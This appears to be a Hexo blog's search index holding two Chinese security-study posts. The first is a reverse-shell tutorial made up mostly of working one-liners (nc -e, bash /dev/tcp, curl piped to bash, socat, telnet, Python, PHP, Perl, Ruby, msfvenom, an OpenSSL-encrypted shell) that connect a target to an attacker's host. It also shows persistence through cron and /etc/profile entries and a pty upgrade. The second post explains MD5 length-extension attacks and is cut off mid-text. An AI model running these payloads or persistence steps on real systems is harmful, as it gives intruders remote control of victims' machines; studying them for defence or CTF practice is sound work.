<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>反弹shell</title>
      <link href="/2024/05/13/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2024/05/13/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>什么是反弹shell：<br>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务端，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><p>正向连接：<br>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><p>什么情况下需要用到反弹shell：<br>大致有如下几种情况：</p><blockquote><p>由于防火墙等限制，对方机器只能发送请求，不能接收请求。<br>拿到了目标机器的远程执行命令权限，为操作方便想要在本机拿到 shell 。<br>目标机位于局域网，直接连接不了。<br>目标机器的ip动态改变，你不能持续控制。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策</p></blockquote><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果有python环境，可以利用 python 反弹。如果具有 php 环境也同理。</p><h2 id="netcat监听反弹shell"><a href="#netcat监听反弹shell" class="headerlink" title="netcat监听反弹shell"></a>netcat监听反弹shell</h2><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">wget下载获取网站目录下资源</span><br><span class="line"></span><br><span class="line">./ 执行文件</span><br><span class="line"></span><br><span class="line">make</span><br><span class="line">根据Makefile文件编译源代码、连接、生成目标文件、可执行文件。</span><br><span class="line"></span><br><span class="line">make install</span><br><span class="line">将编译成功的可执行文件安装到系统目录中，一般为usr/local/bin目录。</span><br><span class="line"></span><br><span class="line">make clean</span><br><span class="line">清除上次的make命令所产生的object文件（后缀为“.o”的文件）及可执行文件。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b056296.png" alt="image-20240406005137907"></p><p>NC常用参数介绍：</p><blockquote><p>-l：侦听模式，即使没有接收到数据包，也会一直保持连接状态。</p><p>-p：指定本地端口号。如果未指定，则nc将随机选择一个空闲的端口。</p><p>-v：提供更详细的输出信息，例如打印出nc建立的连接和传输的数据。使用vv获取更详细的信息。</p><p>-e：指定要在连接建立后执行的命令。</p><p>-n：不执行DNS解析，使用IP地址连接。</p><p>-u：使用UDP协议而不是默认的TCP协议。</p><p>-w：设置超时时间。如果在指定的时间内没有连接或数据传输，则nc将退出。</p><p>-z：仅扫描目标主机的端口，不进行数据传</p></blockquote><p>监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcat -lvvp 监听端口号</span><br><span class="line">nc -lvvn 监听端口号</span><br><span class="line">nc -lvnp 监听端口号</span><br><span class="line"></span><br><span class="line">#几个一样的</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9af30cf2.png" alt="image-20240406005714273"></p><p>主动连接（nc的反弹shell）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netcat 192.xxx.xxx.1 2333 -e /bin/bash</span><br><span class="line"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span><br><span class="line">#-e后面跟的参数代表的是在创建连接后执行的程序</span><br></pre></td></tr></table></figure><p>注： 要开端口</p><h2 id="Bash反弹shell"><a href="#Bash反弹shell" class="headerlink" title="Bash反弹shell"></a>Bash反弹shell</h2><p>将如下命令写入目标主机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot; #更稳定</span><br><span class="line"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>其他shell：sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash</p><p>以下是针对Bash反弹一句话进各个部分的说明：</p><table><thead><tr><th><strong>命令</strong></th><th><strong>命令详解</strong></th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。这样在被攻击机上就不会显示执行的命令。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p><strong>输入0是由&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333 输入的，也就是攻击机的输入，命令执行的结果1，会输出到&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333上，这就形成了一个回路，实现了我们远程交互式shell 的功能</strong></p><p>然后攻击机在本地监听就可以了</p><h2 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h2><p>在目标机上执行 curl 攻击者web服务ip|bash，该 ip 的web服务目录里的 index 文件上含有 bash 一句话，就可以反弹shell。</p><p>首先，在攻击者自己的服务器 web 目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/攻击者主机ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>开启2333端口的监听。(port)</p><p>然后再目标机上执行如下，即可反弹shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 攻击者web服务ip|bash</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0777e9.png" alt="image-20240407194208309"></p><p>根据curl命令和Linux管道的作用，你不难理解这其中的原理。</p><p>Curl配合Bash反弹shell的方式在CTF题目中经常出现，curl IP|bash 中的IP可以是任意格式的，可以是十进制、十六进制、八进制、二进制等等。</p><h2 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h2><p>Socat是Linux 下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，不过据说可以看做netcat的加强版，事实上的确也是如此。我这里只简单的介绍下怎么使用它开启监听和反弹shell，其他详细内容可以参见<a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">这里</a></p><p>安装Socat的方法很简单：</p><blockquote><p>Ubuntu等可以直接使用 apt-get install socat 命令进行安装•也可以去官网下载<a href="http://www.dest-unreach.org/socat">源码包</a></p></blockquote><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">socat TCP-LISTEN:<span class="number">2333</span> -或nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat tcp-connect:47.xxx.xxx.72:2333 exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b05ab65.png" alt="image-20240407195514295"></p><h2 id="Telnet反弹shell"><a href="#Telnet反弹shell" class="headerlink" title="Telnet反弹shell"></a>Telnet反弹shell</h2><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以使用Telnet反弹shell。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mknod a p; telnet <span class="number">47</span>.xxx.xxx.<span class="number">72</span> <span class="number">2333</span> <span class="number">0</span>&lt;a | /bin/bash <span class="number">1</span>&gt;a</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0625ba.png" alt="image-20240407195932242"></p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>攻击机需要开启两个本地监听：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0c7d3d.png" alt="image-20240407200107374"></p><p>如上图所示，获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p><h2 id="脚本反弹shell"><a href="#脚本反弹shell" class="headerlink" title="脚本反弹shell"></a>脚本反弹shell</h2><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b071159.png" alt="image-20240407200409152"></p><h3 id="php脚本"><a href="#php脚本" class="headerlink" title="php脚本"></a>php脚本</h3><p>当目标主机上有php环境时，我们可以用php来反弹shell。</p><p>攻击机开启本地监听：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);shell_exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);`/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3`;&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);system(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);passthru(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);popen(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;, &quot;r&quot;);&#x27;</span></span><br><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,4242);$proc=proc_open(&quot;/bin/sh -i&quot;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="perl脚本"><a href="#perl脚本" class="headerlink" title="perl脚本"></a>perl脚本</h3><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p>攻击端开启端口监听</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444 </span><br></pre></td></tr></table></figure><p>目标主机脚本连接攻击机</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl -MIO -e <span class="string">&#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NOTE: Windows only</span><br><span class="line">perl -MIO -e <span class="string">&#x27;$c=new IO::Socket::INET(PeerAddr,&quot;10.0.0.1:4242&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b074baa.png" alt="image-20240407201033182"></p><h3 id="Ruby脚本"><a href="#Ruby脚本" class="headerlink" title="Ruby脚本"></a>Ruby脚本</h3><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p>攻击机开启本地监听：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">2333</span></span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：</p><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">&#x27;f=TCPSocket.open(&quot;10.0.0.1&quot;,4242).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ruby -rsocket -e<span class="string">&#x27;exit if fork;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);loop&#123;c.gets.chomp!;(exit! if $_==&quot;exit&quot;);($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r)&#123;|io|c.print io.read&#125;))rescue c.puts &quot;failed: <span class="subst">#&#123;<span class="variable">$_</span>&#125;</span>&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">NOTE:</span> Windows only</span></span><br><span class="line">ruby -rsocket -e <span class="string">&#x27;c=TCPSocket.new(&quot;10.0.0.1&quot;,&quot;4242&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9aff3303.png" alt="image-20240407201336569"></p><h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 msfvenom -l 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们直接可以使用 msfvenom -l 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -l payloads | grep &#x27;cmd/unix/reverse&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b116c69.png" alt="image-20240407202206782"></p><p>如上图所示，metasploit支持生成反弹shell一句话的类型非常丰富，大家可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</span><br></pre></td></tr></table></figure><blockquote><p>-p 指定要使用的payload(攻击荷载)。<br>-f 指定输出格式</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a9b115960.png" alt="image-20240407202403110"></p><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0edf68.png" alt="image-20240407202448000"></p><h2 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h3 id="OpenSSL-简介"><a href="#OpenSSL-简介" class="headerlink" title="OpenSSL 简介"></a>OpenSSL 简介</h3><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><blockquote><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p></blockquote><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a9b088f2a.png" alt="image-20240407203949064"></p><h3 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h3><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</span><br></pre></td></tr></table></figure><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9b0af269.png" alt="image-20240407204322227"></p><p>这样攻击者便使用 OpenSSL 反弹了目标机一个加密的 shell。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="将反弹shell的命令写入定时任务"><a href="#将反弹shell的命令写入定时任务" class="headerlink" title="将反弹shell的命令写入定时任务"></a>将反弹shell的命令写入定时任务</h3><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;[crontabs]&#x2F; 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。</p><blockquote><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root 中。(centos系列主机)</p><p>比如，当前用户名为root，我们就要将下面内容写入到 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root 中。(Debian&#x2F;Ubuntu系列主机)</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">*/<span class="number">1</span>  *  *  *  *   /bin/bash -i&gt;&amp;/dev/tcp/<span class="number">47</span>.xxx.xxx.<span class="number">72</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span><span class="comment">#每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><h3 id="将反弹shell命令写入-etc-profile文件"><a href="#将反弹shell命令写入-etc-profile文件" class="headerlink" title="将反弹shell命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell命令写入&#x2F;etc&#x2F;profile文件</h3><p>将以下反弹shell的命写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/<span class="number">47</span>.xxx.xxx.<span class="number">72</span>/<span class="number">2333</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span> &amp;<span class="comment"># 最后面那个&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><h3 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h3><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li><p>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</p></li><li><p>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</p></li><li><p>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</p></li></ul><p><img src="https://bu.dusays.com/2024/05/13/6641a9b082dda.png" alt="image-20240407203253916"></p><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>我们只需在获取的shell里面输入如下命令，即可模拟一个终端设备：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a9afb6bae.png" alt="image-20240407203401749"></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MD5长度拓展攻击</title>
      <link href="/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/"/>
      <url>/2024/05/13/MD5%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="Hash长度拓展攻击"><a href="#Hash长度拓展攻击" class="headerlink" title="Hash长度拓展攻击"></a>Hash长度拓展攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>MD5是一种广泛使用的哈希函数，它产生一个128位（16字节）的哈希值。通常呈现为一个32字符的十六进制数。它是一种单项函数，这意味着从MD5哈希值是不可能（在实践中）直接得到原始数据的。换句话说，MD5不是加密过程；它是一个单向散列函数，没有一个反向的过程能够从散列值中恢复出准确的原始输入。</p><p>哈希长度扩展攻击（也称为哈希长度扩充攻击或者Hash Extension Attack）是一种针对使用Merkle-Damgard构造的哈希函数（如MD5, SHA-1, SHA-256）的加密攻击。Merkle-Damgard构造是一种创建哈希函数的方法，其典型结构包括一个基本的压缩函数和一个填充方案，确保输入数据的长度是特定倍数。</p><p>哈希长度扩展攻击的原理基于以下几点：</p><blockquote><p>可预见的填充： Merkle-Damgård实现使用一个预定义的方式来填充消息，以确保信息长度符合要求。通常填充以一个bit的’1’开始，然后是一串’0’，最后是一个表示原始消息长度的64位（对于MD5和SHA-1）或128位（对于某些SHA-2函数）的二进制数。攻击者知道这个填充方案。</p></blockquote><blockquote><p>状态保持： 哈希函数在处理信息的时候，会将信息分成固定大小的块，然后通过压缩函数逐块处理。每块处理结束后，压缩函数的输出会成为下一块处理的输入（称为”链式状态”或”中间哈希值”）。最终块处理完成后产生的输出便是整个消息的哈希值。</p></blockquote><blockquote><p>不需要初始状态： 在进行哈希计算时，攻击者并不需要知道原始消息的具体内容，只需知道原始消息哈希的中间状态或最终状态。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">想象一下，有一个秘密盒子（哈希函数），这个盒子可以把任何东西（数据）变成一堆乱码（哈希值），而且这个过程是单向的，就是说你不能从乱码再变回原来的东西。</span><br><span class="line"></span><br><span class="line">通常，当你把一些东西放进这个盒子时，如果想要让盒子正常工作，你需要在东西的后面放些填充物，比如棉花。这个填充过程是按照一定的规则来的，比如先放一点特别的棉花，再放一些普通的棉花，最后放一点标记原来东西大小的棉花。</span><br><span class="line"></span><br><span class="line">哈希长度扩展攻击就是有人发现了这个秘密：他们不需要知道你原来放进去的是什么，只要知道最后的乱码和你放进去东西的大小，他们就能在不打开盒子的情况下，在你的东西后面加上更多的东西和填充物，然后算出这个新组合的乱码。</span><br><span class="line"></span><br><span class="line">这样他们就能假装知道你最初放进去的东西，实际上他们只是在你的东西后面加了些自己的东西，然后算出了一个看起来合理的乱码。</span><br><span class="line"></span><br><span class="line">这种攻击之所以可行，是因为填充规则是公开的，而且这个秘密盒子在处理东西时有一些可以预测的特点。所以，如果别人知道你的乱码和你放进去东西的大小，他们就可能利用这些信息进行攻击。</span><br></pre></td></tr></table></figure><p>哈希长度扩展攻击(hash length extension attacks)是指针对某些允许包含额外信息的加密散列函数的攻击手段。该攻击适用于在消息与密钥的长度已知的情形下，所有采取了 H(密钥 ∥ 消息) 此类构造的散列函数。MD5和SHA-1等基于Merkle–Damgård构造的算法均对此类攻击显示出脆弱性。</p><p>如果一个应用程序是这样操作的：</p><ol><li>准备了一个密文和一些数据构造成一个字符串里，并且使用了MD5之类的哈希函数生成了一个哈希值（也就是所谓的signature&#x2F;签名）</li><li>让攻击者可以提交数据以及哈希值，虽然攻击者不知道密文</li><li>服务器把提交的数据跟密文构造成字符串，并经过哈希后判断是否等同于提交上来的哈希值</li></ol><p>这个时候，该应用程序就易受长度扩展攻击，攻击者可以构造出{secret || data || attacker_controlled_data}的哈希值<em>。</em></p><p>-——————————————————————-</p><blockquote><p>系统会自动生成一串任意的字节串secret，以及一串明文c1然后进行哈希加密，</p><p>m1&#x3D;hash(secret+c1)</p><p>我们可以得到加密后的密文m1，</p><p>然后我们需要提供一个密文m2，以及一串明文c2</p><p>使得</p><p>m2&#x3D;hash(secret+c2)</p><p>#一般来说，c1 in c2,c2实际上为c1的拓展部分，我们需要把明文的长度拓展一下，进行攻击</p><p>然后即可得到flag</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a9331bff9.png" alt="image-20240416201353405"></p><p><strong>分块</strong><br>哈希计算进行加密时，通常是将明文信息以类似块密码的形式进行分组，对各个组块依次加密，每一块一般为512 bit，也就是64 bytes，每组的明文部分为56 